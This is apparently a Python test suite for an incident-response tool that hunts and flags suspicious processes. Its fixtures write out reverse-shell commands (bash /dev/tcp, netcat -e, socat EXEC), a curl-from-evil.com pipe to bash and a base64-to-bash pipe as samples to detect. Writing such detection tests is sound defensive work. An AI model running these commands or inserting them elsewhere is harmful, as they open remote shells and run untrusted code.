# tests/test_process_hunter.py
"""Tests for the Process Hunter script."""

import json
import os
import re
import tempfile
import unittest
from unittest.mock import patch, MagicMock


class TestSearchProcesses(unittest.TestCase):
    """Tests for the search_processes function."""

    def setUp(self):
        """Set up mock process data for testing."""
        self.mock_processes = [
            {
                'pid': 100,
                'ppid': 1,
                'name': 'bash',
                'exe': '/bin/bash',
                'cmdline': 'bash',
                'username': 'user1',
                'status': 'running',
                'create_time': '2024-01-01T10:00:00',
                'cwd': '/home/user1',
            },
            {
                'pid': 200,
                'ppid': 100,
                'name': 'python3',
                'exe': '/usr/bin/python3',
                'cmdline': 'python3 /tmp/script.py',
                'username': 'user1',
                'status': 'running',
                'create_time': '2024-01-01T11:00:00',
                'cwd': '/tmp',
            },
            {
                'pid': 300,
                'ppid': 1,
                'name': 'nc',
                'exe': '/usr/bin/nc',
                'cmdline': 'nc -lvp 4444',
                'username': 'root',
                'status': 'running',
                'create_time': '2024-01-01T12:00:00',
                'cwd': '/root',
            },
            {
                'pid': 400,
                'ppid': 1,
                'name': 'curl',
                'exe': '/usr/bin/curl',
                'cmdline': 'curl http://evil.com/malware.sh | bash',
                'username': 'root',
                'status': 'running',
                'create_time': '2024-01-01T13:00:00',
                'cwd': '/root',
            },
            {
                'pid': 500,
                'ppid': 1,
                'name': 'hidden_process',
                'exe': '/home/user/.hidden/backdoor',
                'cmdline': '/home/user/.hidden/backdoor',
                'username': 'user1',
                'status': 'running',
                'create_time': '2024-01-01T14:00:00',
                'cwd': '/home/user/.hidden',
            },
        ]

    @patch('ir_scripts.process_hunter.get_all_processes')
    def test_search_by_name_pattern(self, mock_get_all):
        """Test searching processes by name pattern."""
        from ir_scripts.process_hunter import search_processes

        mock_get_all.return_value = self.mock_processes

        results = search_processes(r'bash', search_cmdline=False)
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]['name'], 'bash')

    @patch('ir_scripts.process_hunter.get_all_processes')
    def test_search_by_cmdline_pattern(self, mock_get_all):
        """Test searching processes by command line pattern."""
        from ir_scripts.process_hunter import search_processes

        mock_get_all.return_value = self.mock_processes

        results = search_processes(r'4444', search_cmdline=True)
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]['name'], 'nc')

    @patch('ir_scripts.process_hunter.get_all_processes')
    def test_search_regex_pattern(self, mock_get_all):
        """Test searching with regex patterns."""
        from ir_scripts.process_hunter import search_processes

        mock_get_all.return_value = self.mock_processes

        # Search for processes with 'python' or 'bash' in name
        results = search_processes(r'(python|bash)', search_cmdline=False)
        self.assertEqual(len(results), 2)

    @patch('ir_scripts.process_hunter.get_all_processes')
    def test_search_no_matches(self, mock_get_all):
        """Test searching with no matches returns empty list."""
        from ir_scripts.process_hunter import search_processes

        mock_get_all.return_value = self.mock_processes

        results = search_processes(r'nonexistent', search_cmdline=True)
        self.assertEqual(len(results), 0)

    @patch('ir_scripts.process_hunter.get_all_processes')
    def test_search_case_insensitive(self, mock_get_all):
        """Test that search is case insensitive."""
        from ir_scripts.process_hunter import search_processes

        mock_get_all.return_value = self.mock_processes

        results = search_processes(r'BASH', search_cmdline=False)
        self.assertEqual(len(results), 1)


class TestCheckSuspicious(unittest.TestCase):
    """Tests for the check_suspicious function."""

    def test_suspicious_path_tmp(self):
        """Test detection of processes running from /tmp/."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'malware',
            'exe': '/tmp/malware',
            'cmdline': '/tmp/malware',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('tmp' in i.lower() for i in indicators))

    def test_suspicious_path_dev_shm(self):
        """Test detection of processes running from /dev/shm/."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'malware',
            'exe': '/dev/shm/evil',
            'cmdline': '/dev/shm/evil',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('dev/shm' in i.lower() for i in indicators))

    def test_suspicious_path_var_tmp(self):
        """Test detection of processes running from /var/tmp/."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'malware',
            'exe': '/var/tmp/script',
            'cmdline': '/var/tmp/script',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('var/tmp' in i.lower() for i in indicators))

    def test_suspicious_hidden_path(self):
        """Test detection of processes running from hidden directories."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'backdoor',
            'exe': '/home/user/.hidden/backdoor',
            'cmdline': '/home/user/.hidden/backdoor',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('hidden' in i.lower() for i in indicators))

    def test_suspicious_name_nc(self):
        """Test detection of suspicious process names (nc)."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'nc',
            'exe': '/usr/bin/nc',
            'cmdline': 'nc -lvp 4444',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('nc' in i.lower() for i in indicators))

    def test_suspicious_name_netcat(self):
        """Test detection of suspicious process names (netcat)."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'netcat',
            'exe': '/usr/bin/netcat',
            'cmdline': 'netcat -e /bin/bash 10.0.0.1 4444',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(len(indicators) > 0)

    def test_suspicious_name_socat(self):
        """Test detection of suspicious process names (socat)."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'socat',
            'exe': '/usr/bin/socat',
            'cmdline': 'socat TCP:10.0.0.1:4444 EXEC:/bin/bash',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(len(indicators) > 0)

    def test_suspicious_cmdline_reverse_shell(self):
        """Test detection of reverse shell patterns in cmdline."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'bash',
            'exe': '/bin/bash',
            'cmdline': 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('dev/tcp' in i.lower() for i in indicators))

    def test_suspicious_cmdline_base64_decode(self):
        """Test detection of base64 decode in cmdline."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'bash',
            'exe': '/bin/bash',
            'cmdline': 'echo SGVsbG8gV29ybGQK | base64 -d | bash',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('base64' in i.lower() for i in indicators))

    def test_suspicious_cmdline_eval(self):
        """Test detection of eval patterns in cmdline."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'python3',
            'exe': '/usr/bin/python3',
            'cmdline': "python3 -c \"exec(eval('malicious_code'))\"",
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('eval' in i.lower() for i in indicators))

    def test_suspicious_cmdline_bash_interactive(self):
        """Test detection of bash -i pattern."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'bash',
            'exe': '/bin/bash',
            'cmdline': 'bash -i',
        }
        indicators = check_suspicious(proc)
        self.assertTrue(any('bash -i' in i.lower() for i in indicators))

    def test_no_suspicious_indicators(self):
        """Test that normal processes have no suspicious indicators."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'systemd',
            'exe': '/usr/lib/systemd/systemd',
            'cmdline': '/usr/lib/systemd/systemd --user',
        }
        indicators = check_suspicious(proc)
        self.assertEqual(len(indicators), 0)

    def test_check_suspicious_handles_none_values(self):
        """Test that check_suspicious handles None values gracefully."""
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': None,
            'exe': None,
            'cmdline': None,
        }
        indicators = check_suspicious(proc)
        self.assertIsInstance(indicators, list)


class TestFormatProcessDetails(unittest.TestCase):
    """Tests for the format_process_details function."""

    def test_format_includes_basic_info(self):
        """Test that format includes PID, name, exe, cmdline."""
        from ir_scripts.process_hunter import format_process_details

        proc = {
            'pid': 123,
            'name': 'test_process',
            'exe': '/usr/bin/test',
            'cmdline': 'test arg1 arg2',
            'username': 'testuser',
        }
        output = format_process_details(proc)

        self.assertIn('123', output)
        self.assertIn('test_process', output)
        self.assertIn('/usr/bin/test', output)
        self.assertIn('test arg1 arg2', output)

    def test_format_handles_missing_fields(self):
        """Test that format handles missing fields gracefully."""
        from ir_scripts.process_hunter import format_process_details

        proc = {'pid': 123, 'name': 'test'}
        output = format_process_details(proc)

        self.assertIn('123', output)
        self.assertIn('test', output)
        self.assertIsInstance(output, str)


class TestOutputToFile(unittest.TestCase):
    """Tests for output file functionality."""

    def setUp(self):
        """Set up temporary directory for test files."""
        self.temp_dir = tempfile.mkdtemp()
        self.output_file = os.path.join(self.temp_dir, 'results.json')

    def tearDown(self):
        """Clean up temporary files."""
        if os.path.exists(self.output_file):
            os.remove(self.output_file)
        if os.path.exists(self.temp_dir):
            os.rmdir(self.temp_dir)

    @patch('ir_scripts.process_hunter.get_all_processes')
    def test_output_creates_json_file(self, mock_get_all):
        """Test that output option creates a valid JSON file."""
        from ir_scripts.process_hunter import search_processes, save_results

        mock_get_all.return_value = [
            {
                'pid': 100,
                'name': 'bash',
                'exe': '/bin/bash',
                'cmdline': 'bash',
            }
        ]

        results = search_processes(r'bash', search_cmdline=False)
        save_results(results, self.output_file)

        self.assertTrue(os.path.exists(self.output_file))
        with open(self.output_file, 'r') as f:
            data = json.load(f)
        self.assertIsInstance(data, list)
        self.assertEqual(len(data), 1)


class TestCLI(unittest.TestCase):
    """Tests for CLI argument parsing."""

    def test_cli_requires_pattern(self):
        """Test that CLI requires a pattern argument."""
        from ir_scripts.process_hunter import create_parser

        parser = create_parser()
        with self.assertRaises(SystemExit):
            parser.parse_args([])

    def test_cli_accepts_pattern(self):
        """Test that CLI accepts a pattern argument."""
        from ir_scripts.process_hunter import create_parser

        parser = create_parser()
        args = parser.parse_args(['test_pattern'])
        self.assertEqual(args.pattern, 'test_pattern')

    def test_cli_cmdline_option(self):
        """Test that CLI accepts -c/--cmdline option."""
        from ir_scripts.process_hunter import create_parser

        parser = create_parser()
        args = parser.parse_args(['-c', 'pattern'])
        self.assertTrue(args.cmdline)

        args = parser.parse_args(['--cmdline', 'pattern'])
        self.assertTrue(args.cmdline)

    def test_cli_kill_option(self):
        """Test that CLI accepts -k/--kill option."""
        from ir_scripts.process_hunter import create_parser

        parser = create_parser()
        args = parser.parse_args(['-k', 'pattern'])
        self.assertTrue(args.kill)

        args = parser.parse_args(['--kill', 'pattern'])
        self.assertTrue(args.kill)

    def test_cli_output_option(self):
        """Test that CLI accepts -o/--output option."""
        from ir_scripts.process_hunter import create_parser

        parser = create_parser()
        args = parser.parse_args(['-o', 'output.json', 'pattern'])
        self.assertEqual(args.output, 'output.json')

        args = parser.parse_args(['--output', 'output.json', 'pattern'])
        self.assertEqual(args.output, 'output.json')


class TestKillFunctionality(unittest.TestCase):
    """Tests for the kill functionality."""

    @patch('ir_scripts.process_hunter.psutil.Process')
    @patch('builtins.input', return_value='y')
    def test_kill_with_confirmation(self, mock_input, mock_process):
        """Test that kill asks for confirmation."""
        from ir_scripts.process_hunter import kill_process_interactive

        mock_proc = MagicMock()
        mock_process.return_value = mock_proc

        proc_info = {'pid': 123, 'name': 'test'}
        result = kill_process_interactive(proc_info)

        mock_input.assert_called_once()
        mock_proc.terminate.assert_called_once()
        self.assertTrue(result)

    @patch('ir_scripts.process_hunter.psutil.Process')
    @patch('builtins.input', return_value='n')
    def test_kill_cancelled_on_no(self, mock_input, mock_process):
        """Test that kill is cancelled when user says no."""
        from ir_scripts.process_hunter import kill_process_interactive

        mock_proc = MagicMock()
        mock_process.return_value = mock_proc

        proc_info = {'pid': 123, 'name': 'test'}
        result = kill_process_interactive(proc_info)

        mock_input.assert_called_once()
        mock_proc.terminate.assert_not_called()
        self.assertFalse(result)


if __name__ == '__main__':
    unittest.main()
